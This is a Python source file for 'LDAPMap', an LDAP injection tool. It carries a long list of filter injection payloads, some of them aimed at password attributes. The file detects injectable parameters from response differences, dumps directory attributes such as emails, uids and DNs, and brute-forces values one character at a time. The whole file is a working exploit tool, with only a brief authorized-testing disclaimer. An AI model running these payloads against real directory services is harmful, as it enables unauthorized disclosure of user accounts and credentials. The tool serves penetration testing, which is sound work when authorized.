#!/usr/bin/env python3
"""
LDAPMap

added:
 - JSON / XML / HTML parsing for structured extraction
 - Response fingerprinting via SHA256
 - Rate-limiting / delay controls
 - Proxy support
 - Time-based blind detection & character-by-character extraction
 - Character brute-forcing (diff-based or time-based)
 - Expanded payload set + basic encodings
 - Output JSON export (--output results.json)

LEGAL / ETHICAL WARNING:
  This tool is intended for authorized security testing only. Do not use it on systems
  you do not own or do not have explicit permission to test. The author assumes no
  responsibility for misuse.

Usage highlights:
  python3 ldapmap.py -u "http://127.0.0.1:8002/api.php?usernames=*" --dump
  python3 ldapmap.py -r req.txt --dump
  python3 ldapmap.py -u "http://127.0.0.1:8002/api.php?usernames=*" --charbrute uid --maxlen 16 --blind-mode time --blind-time 1.5 --chars "abcdefghijklmnopqrstuvwxyz0123456789_" 
"""

import argparse
import requests
import re
import sys
import threading
import queue
import time
import json
import hashlib
import html
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote_plus, unquote_plus
import xml.etree.ElementTree as ET

#payloads
TAUTOLOGY_PAYLOADS = [
    # mevcutların
    "*", "*)(&(objectClass=*))",
    "*)(|(objectClass=*))",
    "*)(|(uid=*))",
    "*)(|(cn=*))",
    "*)(&(objectClass=*))",
    "*)(|(objectClass=*))",
    "*)(|(uid=*))",
    "*)(|(cn=*))",
    "*)(|(mail=*))",
    "*)(|(sAMAccountName=*))",
    "*)(|(userPrincipalName=*))",
    "*)(|(objectClass=person))",
    "*)(|(objectClass=organizationalPerson))",
    "*)(uid=*))(|(uid=*",
    "*)(&(uid=*))(|(uid=*",   
    "*)(|(sn=*))",            
    "*)(|(givenName=*))",
    "*)(|(memberOf=*))",
    "*)(|(description=*))",
    "*)(|(objectClass=*))(#",
    "*)(|(objectClass=*));",
    "*)(|(objectClass=*))\\00",
    "*)(|(objectClass=*))/*",
    "*)(*",
    "*)(*(",
    "*))((",
    ")()(",
    "*)(|(uid=admin))",
    "*)(uid=*))(|(uid=admin",
    "*)(mail=*)",
    "*)(telephoneNumber=*)",
    "*)(department=*)",
    "*)(title=*)",
    "*)(|(uid=*)(cn=*))",
    "*)(|(uid=*)(mail=*))",
    "*)(|(userPrincipalName=*)(sAMAccountName=*))",
    "*)(|(manager=*)(manager=*@*))",
    "adm*",
    "admin*",
    "*a*",
    "*admin*",
    "a*d*m*i*n",
    "adm*)(objectClass=*)",
    "*)(!(uid=*))",
    "*)(&(objectClass=person)(!(uid=admin)))",
    "*)(!(uid=admin))(|(objectClass=*))",
    "*(cn~=admin)",
    "*(mail~=*@*.com)",
    "*)(|(cn~=*admin*))",
    "*)(uid=*))(|(sleep=5))",
    "*)(uid=*))(|(doHeavyQuery=1))",
    "*)(|(cn=*)(memberOf=*))",
    "*)(|(objectClass=*))/*",
    "*)(|(objectClass=*))--",
    "*)(|(objectClass=*))%00",
    "*)(|(objectClass=*))\\00",
    "\\2a", "%2a", "%252a",
    "\\2a)(\\26\\28objectClass\\3d\\2a\\29",
    "*\\00", "*\\5c\\2a", "*\\c0\\af",
    "*)(&", "*))%00", "*()|%26'", "*()|&'",
    "*(|(mail=*))", "*(|(objectclass=*))",
    "*/*", "*|", "/", "//", "//*", "@*", "|",
    "admin*", "admin*)((|userpassword=*)", "admin*)((|userPassword=*)",
    "x' or name()='username' or 'x'='y",
    "(&(!(objectClass=Impresoras))(uid=s*))",
    "(&(objectClass=user)(uid=*))",
    ")(&", "*))%00",
    "*)(objectClass=*))(&objectClass=void",
]


ENCODINGS = [
    lambda s: s,
    lambda s: quote_plus(s),
    lambda s: s.encode('utf-8').hex(),
]


BLIND_SLEEP_TEMPLATES = [
    "*)(&(objectClass=*))",
]

#regex extraction patterns
COMMON_EXTRACT_REGEXPS = {
    "emails": r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}",
    "uid": r"\b(uid|sAMAccountName|userPrincipalName)[:=]\s*([A-Za-z0-9._@-]{2,})\b",
    "cn": r"\b(cn)[:=]\s*([A-Za-z0-9 _\-\']{2,})\b",
    "dn": r"\b(dn)[:=]\s*([A-Za-z0-9,=\/\s\-\._]+)"
}

#default
DEFAULT_BRUTE_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789_-@."

def maybe_print(verbose, *args, **kwargs):
    if verbose:
        print(*args, **kwargs)

def sha256_text(t):
    return hashlib.sha256(t.encode('utf-8', errors='ignore')).hexdigest()

def parse_raw_request_file(path):
    """
    Parse simple raw HTTP request file.
    Returns (method, path_and_query, host, headers_dict, body)
    """
    with open(path, "r", encoding="utf-8") as f:
        raw = f.read().splitlines()

    if not raw:
        raise ValueError("Empty request file")

    idx = 0
    while idx < len(raw) and raw[idx].strip() == "":
        idx += 1
    first = raw[idx].strip()
    m = re.match(r"(?i)(GET|POST|PUT|DELETE|OPTIONS|HEAD)\s+(.+?)(\s+HTTP/[\d\.]+)?$", first)
    if not m:
        raise ValueError("Can't parse request line: " + first)
    method, urlpath = m.group(1).upper(), m.group(2)

    headers = {}
    body_lines = []
    i = idx + 1

    while i < len(raw):
        line = raw[i]
        i += 1
        if line.strip() == "":
            break
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()

    body_lines = raw[i:]
    body = "\n".join(body_lines).lstrip("\n")
    host = headers.get("Host")
    return method.upper(), urlpath, host, headers, body

def build_request_from_parts(method, base_url, headers, body, replace_marker=None):
    """
    If base_url or body contains a '*', replace with replace_marker (quoted where appropriate).
    Return (full_url, method, body)

    NOTE: returns 3-tuple for backward compatibility with code that expects
    (url, _, body) unpacking.
    """
    if replace_marker is None:
        replace_marker = ''

    url = base_url
    if '*' in url:
        url = url.replace('*', quote_plus(replace_marker))

    b = body
    if b and '*' in b:
        b = b.replace('*', replace_marker)


    return url, method, b


def send_request(session, method, url, headers=None, body=None, timeout=15, allow_redirects=True):
    headers = headers or {}
    try:
        if method == "GET":
            r = session.get(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        elif method == "POST":

            ct = headers.get("Content-Type", "").lower()
            if "application/x-www-form-urlencoded" in ct and body is not None:

                try:
                    payload = dict(pair.split("=",1) for pair in body.split("&") if "=" in pair)
                except Exception:
                    payload = body
                r = session.post(url, headers=headers, data=payload, timeout=timeout)
            else:
                r = session.post(url, headers=headers, data=body, timeout=timeout)
        else:
            r = session.request(method, url, headers=headers, data=body, timeout=timeout)
        return r
    except Exception as e:
        return None


def try_parse_json(text):
    try:
        return json.loads(text)
    except Exception:
        return None

def try_parse_xml(text):
    try:
        root = ET.fromstring(text)
        return root
    except Exception:
        return None

def try_extract_from_html(text):

    results = {}
    # title
    m = re.search(r"<title[^>]*>(.*?)</title>", text, flags=re.I|re.S)
    if m:
        results['title'] = html.unescape(m.group(1).strip())
    # pre / code blocks
    pre = re.findall(r"<pre[^>]*>(.*?)</pre>", text, flags=re.I|re.S)
    if pre:
        results['pre'] = [html.unescape(p.strip()) for p in pre]
    # table rows: simplistic
    trs = re.findall(r"<tr[^>]*>(.*?)</tr>", text, flags=re.I|re.S)
    if trs:
        results['rows'] = [re.sub(r'<[^>]+>','',t).strip() for t in trs]
    return results

def extract_common_attributes(text, verbose=False):
    parsed = {}

    j = try_parse_json(text)
    if j:

        def walk(o):
            found = []
            if isinstance(o, dict):
                for k,v in o.items():
                    found += walk(v)
            elif isinstance(o, list):
                for item in o:
                    found += walk(item)
            else:
                if isinstance(o, str):
                    found.append(o)
            return found
        strings = walk(j)
        for s in strings:
            for name, rx in COMMON_EXTRACT_REGEXPS.items():
                for m in re.findall(rx, s, flags=re.I):

                    val = m if isinstance(m, str) else (m[-1] if isinstance(m, tuple) else str(m))
                    parsed.setdefault(name, set()).add(val)

    else:
        x = try_parse_xml(text)
        if x is not None:
            # flatten element text
            for elem in x.iter():
                if elem.text and elem.text.strip():
                    s = elem.text.strip()
                    for name, rx in COMMON_EXTRACT_REGEXPS.items():
                        for m in re.findall(rx, s, flags=re.I):
                            val = m if isinstance(m, str) else (m[-1] if isinstance(m, tuple) else str(m))
                            parsed.setdefault(name, set()).add(val)

    for name, rx in COMMON_EXTRACT_REGEXPS.items():
        matches = re.findall(rx, text, flags=re.I)
        if matches:
            for m in matches:
                val = m if isinstance(m, str) else (m[-1] if isinstance(m, tuple) else str(m))
                parsed.setdefault(name, set()).add(val)

    h = try_extract_from_html(text)
    if h.get('pre'):
        for block in h['pre']:
            for name, rx in COMMON_EXTRACT_REGEXPS.items():
                for m in re.findall(rx, block, flags=re.I):
                    val = m if isinstance(m, str) else (m[-1] if isinstance(m, tuple) else str(m))
                    parsed.setdefault(name, set()).add(val)

    for k in list(parsed.keys()):
        parsed[k] = sorted(list(parsed[k]))[:500]
    return parsed


def detect_injection(session, method, base_url, headers, body, verbose=False, rate_delay=0):
    """
    Improved detection:
      - baseline response + fingerprint
      - test multiple payloads + encodings
      - check response-length diffs, fingerprint diffs, structural changes (json/xml)
      - return detection dict or None
    """
    maybe_print(verbose, "[*] Starting enhanced injection detection")
    session.headers.update({"User-Agent": "ldapmap/0.2"})

    try_marker = "[LDAPMAP-DETECT]"
    url_base = base_url
    body_base = body

    url0, _, body0 = build_request_from_parts(method, url_base, headers, body, replace_marker=try_marker)
    r0 = send_request(session, method, url0, headers, body0)
    baseline_text = r0.text if r0 is not None else ""
    baseline_len = len(baseline_text)
    baseline_hash = sha256_text(baseline_text)
    baseline_json = try_parse_json(baseline_text) is not None
    baseline_xml = try_parse_xml(baseline_text) is not None

    maybe_print(verbose, f"[*] Baseline len={baseline_len} hash={baseline_hash[:8]} json={baseline_json} xml={baseline_xml}")


    def maybe_sleep():
        if rate_delay and rate_delay > 0:
            time.sleep(rate_delay)


    if '*' in url_base or (body_base and '*' in body_base):
        loc = 'url' if '*' in url_base else 'body'
        maybe_print(verbose, f"[*] Found '*' in {loc}; testing payloads there")
        results = []
        for enc in ENCODINGS:
            for p in TAUTOLOGY_PAYLOADS:
                payload = enc(p)
                url_p, _, body_p = build_request_from_parts(method, url_base, headers, body, replace_marker=payload)
                t0 = time.time()
                r = send_request(session, method, url_p, headers, body_p)
                t1 = time.time()
                if r is None:
                    maybe_print(verbose, f"[!] Request failed for payload {payload!r}")
                    maybe_sleep()
                    continue
                diff_len = len(r.text) - baseline_len
                hash_ = sha256_text(r.text)
                is_json = try_parse_json(r.text) is not None
                is_xml = try_parse_xml(r.text) is not None
                results.append((payload, baseline_len, len(r.text), diff_len, hash_, is_json, is_xml, t1-t0))

                if abs(diff_len) > max(5, baseline_len*0.03) or hash_ != baseline_hash or (is_json != baseline_json) or (is_xml != baseline_xml):
                    maybe_print(verbose, f"[+] Possible injection with payload {payload!r}; diff_len={diff_len} time={t1-t0:.2f}s")
                    return {
                        "injection_point": {"type": loc, "location": url_base if loc=='url' else "<body>"},
                        "evidence": results,
                        "baseline": {"len": baseline_len, "hash": baseline_hash, "json": baseline_json, "xml": baseline_xml}
                    }
                maybe_sleep()
        maybe_print(verbose, "[!] No injection detected at explicit marker location")
        return None

    parsed = urlparse(url_base)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    if qs:
        maybe_print(verbose, "[*] No explicit marker; trying query parameters:", [k for k,_ in qs])
        for i, (k, v) in enumerate(qs):
            results = []
            for enc in ENCODINGS:
                for p in TAUTOLOGY_PAYLOADS:
                    payload = enc(p)
                    new_qs = qs.copy()
                    new_qs[i] = (k, payload)
                    new_query = urlencode(new_qs, doseq=True)
                    new_parsed = parsed._replace(query=new_query)
                    new_url = urlunparse(new_parsed)
                    t0 = time.time()
                    r = send_request(session, method, new_url, headers, body)
                    t1 = time.time()
                    if r is None:
                        maybe_sleep()
                        continue
                    diff_len = len(r.text) - baseline_len
                    hash_ = sha256_text(r.text)
                    is_json = try_parse_json(r.text) is not None
                    is_xml = try_parse_xml(r.text) is not None
                    results.append((k, payload, baseline_len, len(r.text), diff_len, hash_, is_json, is_xml, t1-t0))
                    if abs(diff_len) > max(5, baseline_len*0.03) or hash_ != baseline_hash or (is_json != baseline_json) or (is_xml != baseline_xml):
                        maybe_print(verbose, f"[+] Possible injection in param '{k}' with payload {payload!r}; diff={diff_len}")
                        return {
                            "injection_point": {"type": "param", "location": k},
                            "evidence": results,
                            "baseline": {"len": baseline_len, "hash": baseline_hash, "json": baseline_json, "xml": baseline_xml}
                        }
                    maybe_sleep()
    maybe_print(verbose, "[!] No injection detected heuristically (params)")
    return None


def simple_dump(session, method, base_url, headers, body, injection_point, verbose=False, rate_delay=0, timeout=15):
    """
    Attempt to coerce the server into returning more results and parse them using structured parsers.
    """
    results = {"parsed": {}, "raw_samples": [], "requests": []}
    maybe_print(verbose, "[*] Starting improved dump routine")
    session.headers.update({"User-Agent": "ldapmap/0.2"})

    dump_payloads = [
        "*",
        "*)(&(objectClass=*))",
        "*)(|(objectClass=*))",
        "*)(|(uid=*))",
        "*)(|(cn=*))"
    ] + TAUTOLOGY_PAYLOADS

    def maybe_sleep():
        if rate_delay and rate_delay > 0:
            time.sleep(rate_delay)

    for p in dump_payloads:
        for enc in ENCODINGS:
            payload = enc(p)
            url_p, _, body_p = build_request_from_parts(method, base_url, headers, body, replace_marker=payload)
            r = send_request(session, method, url_p, headers, body_p, timeout=timeout)
            if r is None:
                maybe_print(verbose, "[!] Request failed for payload:", payload)
                continue
            text = r.text
            results['raw_samples'].append(text[:5000])
            results['requests'].append({"payload": payload, "len": len(text), "hash": sha256_text(text)})
            parsed = extract_common_attributes(text, verbose=verbose)
            for k, vals in parsed.items():
                results['parsed'].setdefault(k, set()).update(vals)
            maybe_sleep()

        tot = sum(len(v) for v in results['parsed'].values())
        if tot >= 200:
            break


    for k in list(results['parsed'].keys()):
        results['parsed'][k] = sorted(list(results['parsed'][k]))[:1000]
    return results

#Time-based blind & char-by-char extraction
def time_based_test(session, method, base_url, headers, body, test_payload, timeout=20):
    """
    Send test_payload and return response time (or None if failed).
    """
    t0 = time.time()
    r = send_request(session, method, base_url, headers, body, timeout=timeout)
    if r is None:
        return None, None
    t1 = time.time()
    return t1 - t0, (r.text if r is not None else "")

def char_by_char_extract(session, method, base_url, headers, body, injection_point, attr_name,
                         maxlen=32, chars=DEFAULT_BRUTE_CHARS, blind_mode='time', blind_time_threshold=1.0,
                         verbose=False, rate_delay=0, timeout=15):
    """
    Attempt character-by-character extraction for a single attribute name using either:
      - 'time' mode: look for increased response time when correct character is injected
      - 'diff' mode: look for response content changes (hash/length)
    This is highly heuristic and depends on the target app's vuln semantics.
    injection_point: dict returned by detect_injection (for location info)
    """
    maybe_print(verbose, "[*] Starting char-by-char extraction", attr_name, "mode=", blind_mode)
    session.headers.update({"User-Agent": "ldapmap/0.2-charbrute"})
    result = ""
    parsed_base = None

    url_base = base_url
    body_base = body
    url0, _, body0 = build_request_from_parts(method, url_base, headers, body_base, replace_marker="[LDAPMAP-BASE]")
    r0 = send_request(session, method, url0, headers, body0, timeout=timeout)
    base_text = r0.text if r0 is not None else ""
    base_hash = sha256_text(base_text)
    base_len = len(base_text)

    def maybe_sleep():
        if rate_delay and rate_delay > 0:
            time.sleep(rate_delay)

    for pos in range(0, maxlen):
        found = False
        for ch in chars:

            probe = None
            if blind_mode == 'time':

                probe = f"*{result}{ch}*"
            else:

                probe = f"{result + ch}*"

            url_p, _, body_p = build_request_from_parts(method, url_base, headers, body_base, replace_marker=probe)
            t0 = time.time()
            r = send_request(session, method, url_p, headers, body_p, timeout=timeout)
            t1 = time.time()
            if r is None:
                maybe_sleep()
                continue
            resp_time = t1 - t0
            resp_hash = sha256_text(r.text)
            resp_len = len(r.text)
            maybe_print(verbose, f"[char-test] pos={pos} ch={ch!r} time={resp_time:.2f}s len={resp_len} diff_len={resp_len-base_len} hash_diff={resp_hash!=base_hash}")
            if blind_mode == 'time':

                if resp_time >= blind_time_threshold:
                    result += ch
                    found = True
                    maybe_print(verbose, f"[+] Found char (time) at pos {pos}: {ch}")
                    break
            else:

                if resp_hash != base_hash or abs(resp_len - base_len) > max(3, base_len*0.02):
                    result += ch
                    found = True
                    maybe_print(verbose, f"[+] Found char (diff) at pos {pos}: {ch}")
                    break
            maybe_sleep()
        if not found:
            maybe_print(verbose, f"[-] No char found at pos {pos}; assuming end of value.")
            break
    return result
#main
def main():
    parser = argparse.ArgumentParser(prog="ldapmap", description="LDAPMap - enhanced LDAP injection starter tool")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Target URL (use '*' to mark injection point)")
    group.add_argument("-r", "--req", help="Raw HTTP request file (use '*' in URL or body to mark injection point)")

    parser.add_argument("--dump", action="store_true", help="Try to dump/extract values heuristically")
    parser.add_argument("--charbrute", metavar="ATTR", help="Attempt character-by-character extraction for attribute name (heuristic)")
    parser.add_argument("--maxlen", type=int, default=32, help="Max length for charbrute")
    parser.add_argument("--chars", default=DEFAULT_BRUTE_CHARS, help="Characters to try for charbrute")
    parser.add_argument("--blind-mode", choices=["time","diff"], default="time", help="Blind detection mode for charbrute")
    parser.add_argument("--blind-time", type=float, default=1.0, help="Time threshold (seconds) for time-based blind detection")
    parser.add_argument("--rate", type=float, default=0.0, help="Requests per second limit (0=no limit). If set, --delay ignored.")
    parser.add_argument("--delay", type=float, default=0.0, help="Delay in seconds between requests (simple throttle)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (seconds)")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--insecure", action="store_true", help="Allow insecure TLS")
    parser.add_argument("--output", help="Write JSON results to file")
    args = parser.parse_args()

    sess = requests.Session()
    if args.proxy:
        sess.proxies.update({"http": args.proxy, "https": args.proxy})
    if args.insecure:
        sess.verify = False

    rate_delay = 0.0
    if args.rate and args.rate > 0:
        rate_delay = 1.0 / args.rate
    elif args.delay and args.delay > 0:
        rate_delay = args.delay

    method = "GET"
    base_url = None
    headers = {}
    body = None

    if args.req:
        try:
            method, urlpath, host, headers, body = parse_raw_request_file(args.req)
        except Exception as e:
            print("[!] Failed to parse req file:", e)
            sys.exit(1)
        if host is None:
            print("[!] req file missing 'Host' header; include it.")
            sys.exit(1)

        scheme = "https" if headers.get("X-Forwarded-Proto","").lower()=="https" or headers.get("Protocol","").lower()=="https" else "http"
        base_url = f"{scheme}://{host}{urlpath}"
    else:
        base_url = args.url

    maybe_print(args.verbose, "[*] Target:", base_url, "method=", method)
    detection = detect_injection(sess, method, base_url, headers, body, verbose=args.verbose, rate_delay=rate_delay)
    if not detection:
        print("[!] No injection found (heuristic). Try adding '*' marker at the injection point, or tune payloads.")
        sys.exit(0)

    print("[+] Injection likely at:", detection['injection_point'])
    if args.verbose:
        print("Evidence (short):")
        for e in detection.get("evidence", [])[:6]:
            print("  ", e)

    output = {"target": base_url, "detection": detection}

    if args.dump:
        dump_res = simple_dump(sess, method, base_url, headers, body, detection['injection_point'], verbose=args.verbose, rate_delay=rate_delay, timeout=args.timeout)
        print("\n--- Dump Results ---")
        parsed = dump_res.get("parsed", {})
        if not parsed:
            print("No obvious attributes extracted. See raw samples below for manual analysis.")
            for s in dump_res.get("raw_samples", [])[:3]:
                print("---- SAMPLE ----")
                print(s[:2000])
        else:
            for k, vals in parsed.items():
                print(f"\n[{k}] ({len(vals)})")
                for v in vals[:200]:
                    print("  ", v)
        output['dump'] = dump_res

    if args.charbrute:
        attr = args.charbrute
        res = char_by_char_extract(sess, method, base_url, headers, body, detection['injection_point'],
                                   attr_name=attr, maxlen=args.maxlen, chars=args.chars,
                                   blind_mode=args.blind_mode, blind_time_threshold=args.blind_time,
                                   verbose=args.verbose, rate_delay=rate_delay, timeout=args.timeout)
        print(f"\n[charbrute] Extracted value for {attr}: {res!r}")
        output['charbrute'] = {"attr": attr, "value": res}

    if args.output:
        try:
            with open(args.output, "w", encoding="utf-8") as f:
                json.dump(output, f, indent=2)
            print("[*] Wrote results to", args.output)
        except Exception as e:
            print("[!] Failed to write output:", e)

if __name__ == "__main__":
    main()
